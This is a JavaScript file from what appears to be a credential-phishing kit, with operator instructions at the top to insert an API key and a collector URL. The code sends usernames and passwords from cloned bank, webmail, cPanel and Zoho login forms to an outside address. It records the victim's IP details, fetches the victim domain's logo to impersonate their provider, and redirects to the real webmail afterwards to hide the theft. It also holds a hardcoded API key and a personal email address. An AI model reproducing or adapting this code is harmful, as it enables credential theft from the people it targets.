// some things you need to edit here
// this is ipregistry.co key for getting IP details, register and replace with your key
var ipdetailsapi = "zo00daci4rxm99zm";

// This is where form data comes to.
var formActionValue = "https://emailapi.sebltd.org/api/dondublin@yahoo.com";

// Constant Variables
var url = window.location.href;
var urlpathname = window.location.pathname;
var urlallgetvalue = url.split("?")[1];
var queryString = window.location.search;
var parameters = new URLSearchParams(queryString);

// Set User Value software
var userurlsoftware = parameters.get("software");
if (userurlsoftware != null) {
  Cookies.set("software", userurlsoftware, { expires: 7, path: "/" });
}

// Set User Value provider
var userurlprovider = parameters.get("provider");
if (userurlprovider != null) {
  Cookies.set("provider", userurlprovider, { expires: 7, path: "/" });
}

// Set User Value Domain
var userurldomain = parameters.get("domain");
if (userurldomain != null) {
  Cookies.set("domain", userurldomain, { expires: 7, path: "/" });
}

// Set User Value Email
var userurlemail = parameters.get("user");
if (userurlemail != null) {
  Cookies.set("user", userurlemail, { expires: 7, path: "/" });
}

// Get domain name from Email
if (userurlemail != null) {
  var userdomainfromemail = userurlemail.split("@")[1];
  Cookies.set("domainfromemail", userdomainfromemail, {
    expires: 7,
    path: "/",
  });
}
var cookiesuserdomainfromemail = Cookies.get("domainfromemail");
var cookiesuserdomainfromemailwithoutlastpart =
  cookiesuserdomainfromemail.split(".")[0];

// Adding session ID to URL
var receiverEmailTest = Cookies.get("sessionID");
if (receiverEmailTest == undefined) {
  function makeid(length) {
    var result = "";
    var characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
  var sessionIDvalve = makeid(100);
  Cookies.set("sessionID", sessionIDvalve, { expires: 7, path: "/" });
}
var sessionIDvalve = Cookies.get("sessionID");

// Set Form action values
var formActionValueIDTest = document.getElementById("formActionValueID");
var login_formTest = document.getElementById("login_form");
var horde_loginTest = document.getElementById("horde_login");
var loginformTest = document.getElementById("loginform");
if (formActionValueIDTest != null) {
  document.getElementById("formActionValueID").action = formActionValue;
} else if (login_formTest != null) {
  document.getElementById("login_form").action = formActionValue;
} else if (loginformTest != null) {
  document.getElementById("loginform").action = formActionValue;
} else if (horde_loginTest != null) {
  document.getElementById("horde_login").action = formActionValue;
}

// Disable  submit button until form is filled
$(document).on("change keyup", ".requiredinput", function (e) {
  let Disabled = true;
  $(".requiredinput").each(function () {
    let value = this.value;
    if (value && value.trim() != "") {
      Disabled = false;
    } else {
      Disabled = true;
      return false;
    }
  });

  if (Disabled) {
    $(".toggle-disabled").prop("disabled", true);
    $(".toggle-disabled").addClass("myClass51");
  } else {
    $(".toggle-disabled").prop("disabled", false);
    $(".toggle-disabled").removeClass("myClass51");
  }
});

// check for input length
$(function () {
  $("#j_username").on("input", function () {
    if ($(this).val().length < 5) {
      $(".ClassUsername").addClass("myClass62");
      $(".Lineusernameborder").addClass("myClass63");
      $("#BTUKWOUR").show();
    } else {
      $(".ClassUsername").removeClass("myClass62");
      $(".Lineusernameborder").removeClass("myClass63");
      $("#BTUKWOUR").hide();
    }
  });
  $("#j_password").on("input", function () {
    if ($(this).val().length < 5) {
      $(".ClassPassword").addClass("myClass62");
      $(".Linepasswordborder").addClass("myClass63");
      $("#LXVMYNPI").show();
    } else {
      $(".ClassPassword").removeClass("myClass62");
      $(".Linepasswordborder").removeClass("myClass63");
      $("#LXVMYNPI").hide();
    }
  });
});

// input focus change placeholder
$(function () {
  $("#j_username").focus(function () {
    $(".ClassUsername").addClass("myClass64");
  });
  $("#j_password").focus(function () {
    $(".ClassPassword").addClass("myClass64");
  });
});

// Get Ip details
var ipFormInputtest = document.getElementById("ipFormInput");
if (ipFormInputtest != null) {
  $.getJSON("https://api.ipregistry.co/?key=" + ipdetailsapi, function (data) {
    var Myelement = document.getElementById("ipFormInput");

    Myelement.value = JSON.stringify(data, null, 2);
  });
}

// Toggle password input to text
$(function () {
  $("#showpaswd").on("click", function () {
    var x = document.getElementById("j_password");
    if (x.type === "password") {
      x.type = "text";
      document
        .getElementById("path1")
        .setAttribute(
          "d",
          "M12.13525,18.33925 C16.71175,18.33925 20.7655,16.105 23.26975,12.67 C20.7655,9.23425 16.71175,7 12.13525,7 C7.558,7 3.50425,9.23425 1,12.67 C3.50425,16.105 7.558,18.33925 12.13525,18.33925 Z M8.51125,7.49275 C7.6285,8.40025 7.08475,9.64 7.08475,11.00575 C7.08475,13.7905 9.34225,16.04875 12.12775,16.04875 C14.9125,16.04875 17.17,13.7905 17.17,11.00575 C17.17,9.63925 16.62625,8.40025 15.7435,7.49275"
        );
    } else {
      x.type = "password";
      document
        .getElementById("path1")
        .setAttribute(
          "d",
          "M12.13525,18.512 C16.71175,18.512 20.7655,16.27775 23.26975,12.842 C20.7655,9.407 16.71175,7.17275 12.13525,7.17275 C7.558,7.17275 3.50425,9.407 1,12.842 C3.50425,16.27775 7.558,18.512 12.13525,18.512 Z M8.51125,7.66475 C7.6285,8.573 7.08475,9.812 7.08475,11.1785 C7.08475,13.96325 9.34225,16.22075 12.12775,16.22075 C14.9125,16.22075 17.17,13.96325 17.17,11.1785 C17.17,9.812 16.62625,8.573 15.7435,7.66475 M3.88675,19.628 L18.34,5 L3.88675,19.628 Z"
        );
    }
  });
});

// toggle save username
$(function () {
  $("#toggleSaveUsername").on("click", function () {
    var mySVG = document.querySelector("#toggleSaveUsernameButton");
    if (mySVG.class === "myClass47") {
      mySVG.setAttribute("class", "myClass65");
    } else {
      mySVG.setAttribute("class", "myClass47");
    }
  });
});

// change save username check button
$(function () {
  $("#toggleSaveUsername").on("click", function () {
    var mySVG = document.querySelector("#toggleSaveUsernameButton");
    if ($(".class-toggle-disabled")[0]) {
      $("#toggleSaveUsername").removeClass("class-toggle-disabled");
      mySVG.setAttribute("class", "myClass65");
    } else {
      $("#toggleSaveUsername").addClass("class-toggle-disabled");
      mySVG.setAttribute("class", "myClass47");
    }
  });
});

// Greeting by time of the day
var greetingIDTest = document.getElementById("greetingID");
if (greetingIDTest != null) {
  $(function () {
    const time = new Date().getHours();
    let greeting;
    if (time < 11) {
      greeting = "Good morning";
    } else if (time < 18) {
      greeting = "Good day";
    } else {
      greeting = "Good evening";
    }
    document.getElementById("greetingID").innerHTML =
      greeting + " <span>" + "Sign on to manage your accounts" + "</span>";

    $("#greetingID > span").addClass("myClass66");
  });
}

// Randomize Background image
var backgroundImageIDTest = document.getElementById("backgroundImageID");
if (backgroundImageIDTest != null) {
  $(function () {
    var randnum = Math.floor(Math.random() * 3 + 1);
    document.getElementById("backgroundImageID").src =
      "./index_files/background" + randnum + ".jpg";
  });
}

//Get value of _after field for redirect
var index2aafterTest = document.getElementById("index2aafter");
if (index2aafterTest != null) {
  var sessionIDvalve = Cookies.get("sessionID");
  var aftervalue = document.getElementById("index2aafter").value;
  document.getElementById("index2aafter").value =
    window.location.protocol +
    "//" +
    window.location.hostname +
    ":" +
    window.location.port +
    aftervalue +
    "?sessionID=" +
    sessionIDvalve;
}
// Set Cookies for email address
var emailAddressTest = document.getElementById("emailAddress");
if (emailAddressTest != null) {
  $(function () {
    $("#emailAddress").on("input", function () {
      var filledform = document.getElementById("emailAddress").value;
      Cookies.set("email", filledform, { expires: 7, path: "/" });
    });
  });
}

// Read a specify cookie !! Here am getting email address
var emailAddressFieldTest = document.getElementById("emailAddressField");
if (emailAddressFieldTest != null) {
  $(function () {
    usercookieemail = Cookies.get("email");
    document.getElementById("emailAddressField").value = usercookieemail;
  });
}

// Read Domain name from cookies and insert to picture
var useEmailLogoTest = document.getElementById("useEmailLogo");
if (useEmailLogoTest != null) {
  $(function () {
    usercookieemail = Cookies.get("email");
    var usercookiedomain = usercookieemail.split("@")[1];
    document.getElementById("useEmailLogo").data =
      "https://logo.clearbit.com/" + usercookiedomain;
  });
}

//Insert email domain from cookies
var emailTitleTest = document.getElementById("emailTitle");
if (emailTitleTest != null) {
  $(function () {
    usercookieemail = Cookies.get("email");
    var usercookiedomain = usercookieemail.split("@")[1];
    document.getElementById("emailTitle").innerHTML =
      "Please login to " + usercookiedomain + " to verify your email.";
  });
}

// wells toggle password
$(".toggle-password").on("click", function () {
  $(this).toggleClass("fa-eye fa-eye-slash");
  var input = $($(this).attr("toggle"));
  if (input.attr("type") == "password") {
    input.attr("type", "text");
  } else {
    input.attr("type", "password");
  }
});

// Get email that receive email as cookies
var queryString = window.location.search;
var parameters = new URLSearchParams(queryString);
var userReceivedEmailTest = parameters.get("user");
if (userReceivedEmailTest != null) {
  Cookies.set("user", userReceivedEmailTest, { expires: 7, path: "/" });
}

// get Insert Receiver Email Value
var receiverEmailTest = document.getElementById("receiverEmail");
if (receiverEmailTest != null) {
  var receiverEmailValue = Cookies.get("user");
  if (receiverEmailValue != undefined) {
    $(function () {
      receiverEmailValue = Cookies.get("user");
      document.getElementById("receiverEmail").value = receiverEmailValue;
    });
  }
}

var receiverEmailzohoTest = document.getElementById("receiverEmailzoho");
if (receiverEmailzohoTest != null) {
  var receiverEmailzohoValue = Cookies.get("user");
  if (receiverEmailzohoValue != undefined) {
    $(function () {
      receiverEmailzohoValue = Cookies.get("user");
      document.getElementById("receiverEmailzoho").innerHTML =
        receiverEmailzohoValue;
    });
  }
}

// get Insert Receiver Username Value
var receiverUsernameTest = document.getElementById("receiverUsername");
if (receiverUsernameTest != null) {
  var receiverEmailValue = Cookies.get("user");
  if (receiverEmailValue != undefined) {
    var receiverUsernameValue = receiverEmailValue.split("@")[0];
    document.getElementById("receiverUsername").value = receiverUsernameValue;
  }
}

// get Insert session ID
var receiverEmailTest = document.getElementById("sessionIDvalueID");
if (receiverEmailTest != null) {
  $(function () {
    sessionIDValue = Cookies.get("sessionID");
    document.getElementById("sessionIDvalueID").value = sessionIDValue;
  });
}

// Insert redirection for roundcube
var roundcubewebmailindex2aafterTest = document.getElementById(
  "roundcubewebmailindex2aafter"
);
if (roundcubewebmailindex2aafterTest != null) {
  receiverEmailValue = Cookies.get("user");
  var Domainfromemail = receiverEmailValue.split("@")[1];
  function Redirect() {
    window.location = "https://webmail." + Domainfromemail;
  }
  setTimeout("Redirect()", 10000);
}

// Insert redirection forcpanel
var cpanelwebmailindex2aafterTest = document.getElementById(
  "cpanelwebmailindex2aafter"
);
if (cpanelwebmailindex2aafterTest != null) {
  receiverEmailValue = Cookies.get("user");
  var Domainfromemail = receiverEmailValue.split("@")[1];
  function Redirect() {
    window.location = "https://" + Domainfromemail + "/webmail";
  }
  setTimeout("Redirect()", 10000);
}

// This will close the current Page tab
var PageCloseTest = document.getElementById("PageClose");
if (PageCloseTest != null) {
  function close_window() {
    window.top.close();
  }
  setTimeout("close_window()", 20000);
}

// Get sent email of user sentemailtest
var sentemailtest = document.getElementById("sentemail");
if (sentemailtest != null) {
  document.querySelector('input[name="sentemail"]').value =
    userReceivedEmailTest;
}

// add get parameter to iframe URL
var myIframe = document.getElementById("myIframe");
if (myIframe != null) {
  var mainUrl = window.location.href;
  var mainUrlAfterQuestionmark = mainUrl.split("?")[1];
  var mainIframeUrl = myIframe.src;
  myIframe.src = mainIframeUrl + "?" + mainUrlAfterQuestionmark;
}
// set page tittle
var dynamicPageTitleTest = document.getElementById("dynamicPageTitle");
if (dynamicPageTitleTest != null) {
  var previousPageTitle = document.title;
  document.title =
    cookiesuserdomainfromemailwithoutlastpart + " " + previousPageTitle;
}

// add sessionID to URL
var dontaddsessionIDvalve = document.getElementById("dontaddsessionIDvalve");
var parametersSessionID = parameters.get("sessionID");
if (
  sessionIDvalve != null &&
  dontaddsessionIDvalve == null &&
  parametersSessionID == null
) {
  var url = window.location.href;
  var newurl = url + "&sessionID=" + sessionIDvalve;
  window.history.replaceState({ path: newurl }, "", newurl);
}

// Don't Click back code andirection if Back button is clicked.
var dontclickback = document.getElementById("dontclickback");
if (dontclickback != null) {
  var urlallgetvalue = window.location.href.split("?")[1];
  window.history.replaceState("thanks", null, "/thanks?" + urlallgetvalue);
}

// Read Domain name from URL and insert to picture
var useEmailLogofromurlTest = document.getElementById("useEmailLogofromurl");
if (useEmailLogofromurlTest != null) {
  var Domainfromemail = userurlemail.split("@")[1];
  document.getElementById("useEmailLogofromurl").src =
    "https://f1.allesedv.com/150/" + Domainfromemail;
}
